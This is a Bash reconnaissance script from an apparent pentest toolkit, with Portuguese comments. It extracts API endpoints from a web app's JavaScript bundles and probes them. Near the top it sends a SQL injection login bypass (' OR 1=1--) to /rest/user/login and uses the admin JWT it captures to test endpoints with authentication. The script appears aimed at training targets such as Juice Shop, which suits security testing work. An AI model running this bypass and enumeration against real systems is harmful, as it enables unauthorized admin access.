#!/bin/bash
# ==============================================================================
# Ruadan — Extrator de Endpoints de API (fetch/axios/HttpClient) do bundle JS
# ==============================================================================
# Uso: api_route_extract.sh <target> <port> <scheme>
#
# POR QUE ESTE SCRIPT EXISTE: aplicações API-first (JuiceShop, REST, GraphQL)
# têm endpoints que NÃO são paths de arquivo nem rotas SPA — são chamadas HTTP
# no código: this.http.get("/api/..."), fetch("/rest/..."), axios.post(...)
# que NENHUM fuzzer de diretório encontra. Este script:
#   1. Baixa o index.html e todos os bundles .js
#   2. Extrai endpoints com regex: "/api/...", "/rest/...", fetch/axios/http
#   3. Deduplica e filtra assets/CDN
#   4. Testa cada endpoint com GET (sem auth) e GET com JWT (se disponível)
#   5. Emite: API_ENDPOINT_FOUND: <method> <path> (HTTP <code>, <size>B, <auth>)
# ==============================================================================
set -u

TARGET="${1:?uso: api_route_extract.sh <target> <port> <scheme>}"
PORT="${2:-80}"
SCHEME="${3:-http}"
CURL_OPTS="-sk --max-time 20"
TMPD="$(mktemp -d)"
trap 'rm -rf "$TMPD"' EXIT

BASE_URL="${SCHEME}://${TARGET}:${PORT}"
if [ "$SCHEME" = "http" ]; then
    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
    if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
        echo "[api-extract] ${BASE_URL} redireciona para HTTPS — usando ${_redir%/}" >&2
        BASE_URL="${_redir%/}"
    fi
fi
echo "[api-extract] Alvo: ${BASE_URL}"

# Tenta capturar JWT do SQLi probe (se já rodou)
JWT=""
LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
if [ -n "$JWT" ]; then
    echo "[api-extract] JWT admin capturado (${#JWT} chars) — endpoints autenticados serão testados"
else
    echo "[api-extract] Sem JWT — testando apenas endpoints públicos"
fi

# ---- 1. Baixa index.html e descobre bundles JS --------------------------------
curl $CURL_OPTS "${BASE_URL}/" -o "${TMPD}/index.html" 2>/dev/null
[ -s "${TMPD}/index.html" ] || { echo "[api-extract][ERRO] index.html vazio"; exit 0; }

JS_FILES=$(grep -oE '(src|href)="[^"]*\.js"' "${TMPD}/index.html" | sed 's/.*="//;s/"//' | sort -u)
echo "[api-extract] Bundles JS: $(echo "$JS_FILES" | wc -l)"

# ---- 2. Extrai endpoints de API dos bundles ------------------------------------
API_RAW="${TMPD}/api_raw.txt"
: > "$API_RAW"

for js in $JS_FILES; do
    case "$js" in
        http*) url="$js" ;;
        /*)     url="${BASE_URL}${js}" ;;
        *)      url="${BASE_URL}/${js}" ;;
    esac
    curl $CURL_OPTS "$url" -o "${TMPD}/bundle.js" 2>/dev/null
    [ -s "${TMPD}/bundle.js" ] || continue

    # Regex para endpoints de API (vários padrões de código)
    # 1. this.http.get/post/put/delete("...") — Angular HttpClient
    grep -oE 'this\.http\.(get|post|put|delete|patch)\("([^"]+)"' "${TMPD}/bundle.js" \
        | sed 's/.*(\(".*"\))/\1/' | tr -d '"' >> "$API_RAW" 2>/dev/null

    # 2. fetch("...") — fetch API
    grep -oE 'fetch\("([^"]+)"' "${TMPD}/bundle.js" \
        | sed 's/fetch(\(.*\))/\1/' | tr -d '"' >> "$API_RAW" 2>/dev/null

    # 3. axios.get/post("...") — axios
    grep -oE 'axios\.(get|post|put|delete)\("([^"]+)"' "${TMPD}/bundle.js" \
        | sed 's/.*(\(".*"\))/\1/' | tr -d '"' >> "$API_RAW" 2>/dev/null

    # 4. Strings JSON com "/api/" ou "/rest/" hardcoded
    grep -oE '"(/api/[^"]+)"' "${TMPD}/bundle.js" | tr -d '"' >> "$API_RAW" 2>/dev/null
    grep -oE '"(/rest/[^"]+)"' "${TMPD}/bundle.js" | tr -d '"' >> "$API_RAW" 2>/dev/null

    # 5. Template literals com endpoints (backtick strings)
    grep -oE '`/api/[^`]+`' "${TMPD}/bundle.js" | tr -d '`' >> "$API_RAW" 2>/dev/null
    grep -oE '`/rest/[^`]+`' "${TMPD}/bundle.js" | tr -d '`' >> "$API_RAW" 2>/dev/null

    # 6. Interpolação: baseUrl + "/endpoint"
    grep -oE "this\.http\.(get|post|put|delete|patch)\('([^']+)'" "${TMPD}/bundle.js" \
        | sed "s/.*('\(.*\)')/\1/" >> "$API_RAW" 2>/dev/null

    # 7. Endpoints com template Angular: `${environment.apiUrl}/rest/...`
    grep -oE "'(/rest/[^']+)'" "${TMPD}/bundle.js" | tr -d "'" >> "$API_RAW" 2>/dev/null
    grep -oE "'(/api/[^']+)'" "${TMPD}/bundle.js" | tr -d "'" >> "$API_RAW" 2>/dev/null
done

# ---- 3. Filtra e deduplica ---------------------------------------------------
# Remove: paths vazios, CDN, assets, caminhos sem "/", com parâmetros não fechados
API_ROUTES=$(sort -u "$API_RAW" | \
    grep -vE '(^$|^https?://|^//|\.js$|\.css$|\.png$|\.svg$|\.ico$|\.woff|\.map$)' | \
    grep -E '^/(api|rest|ftp|web|metrics|socket\.io)' | \
    sed 's/[$][{][^}]*[}]//g' | \
    sort -u | head -80)

N_API=$(echo "$API_ROUTES" | grep -c . || true)
echo "[api-extract] Endpoints de API extraídos: ${N_API}"
[ "$N_API" -eq 0 ] && exit 0

# ---- 4. Testa cada endpoint (sem auth + com auth se JWT) ----------------------
BASELINE_CODE=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${BASE_URL}/ruadan-nonexist-$(date +%s)" 2>/dev/null)
BASELINE_SIZE=$(curl $CURL_OPTS -o /dev/null -w "%{size_download}" "${BASE_URL}/ruadan-nonexist-$(date +%s)" 2>/dev/null)
echo "[api-extract] Baseline (catch-all): HTTP ${BASELINE_CODE} / ${BASELINE_SIZE}B"

FOUND=0
while read -r route; do
    [ -z "$route" ] && continue
    # Substitui :id por 1 (parâmetros REST)
    test_route=$(echo "$route" | sed 's/:[a-zA-Z]*/1/g')

    # Teste GET sem auth
    code_noauth=$(curl $CURL_OPTS -o /dev/null -w "%{http_code}" "${BASE_URL}${test_route}" 2>/dev/null)
    size_noauth=$(curl $CURL_OPTS -o /dev/null -w "%{size_download}" "${BASE_URL}${test_route}" 2>/dev/null)

    # Teste GET com auth (se temos JWT)
    code_auth=""
    size_auth=""
    if [ -n "$JWT" ]; then
        code_auth=$(curl $CURL_OPTS -H "Authorization: Bearer $JWT" -o /dev/null -w "%{http_code}" "${BASE_URL}${test_route}" 2>/dev/null)
        size_auth=$(curl $CURL_OPTS -H "Authorization: Bearer $JWT" -o /dev/null -w "%{size_download}" "${BASE_URL}${test_route}" 2>/dev/null)
    fi

    # Reporta se difere do baseline OU tem auth diferente de sem auth
    differs=0
    [ "$code_noauth" != "$BASELINE_CODE" ] && differs=1
    [ "$size_noauth" != "$BASELINE_SIZE" ] && differs=1
    if [ -n "$code_auth" ] && [ "$code_auth" != "$code_noauth" ]; then
        differs=1
    fi
    # Endpoints /api/ e /rest/ são sempre valiosos mesmo se parecem catch-all
    echo "$test_route" | grep -qE '^/(api|rest)' && differs=1

    if [ "$differs" -eq 1 ]; then
        AUTH_TAG="noauth:${code_noauth}/${size_noauth}B"
        [ -n "$code_auth" ] && AUTH_TAG="${AUTH_TAG} auth:${code_auth}/${size_auth}B"
        echo "API_ENDPOINT_FOUND: GET ${test_route} (${AUTH_TAG})"
        FOUND=$((FOUND + 1))
    fi
done <<< "$API_ROUTES"

echo "[api-extract] Endpoints reportados: ${FOUND} de ${N_API} extraídos"
exit 0
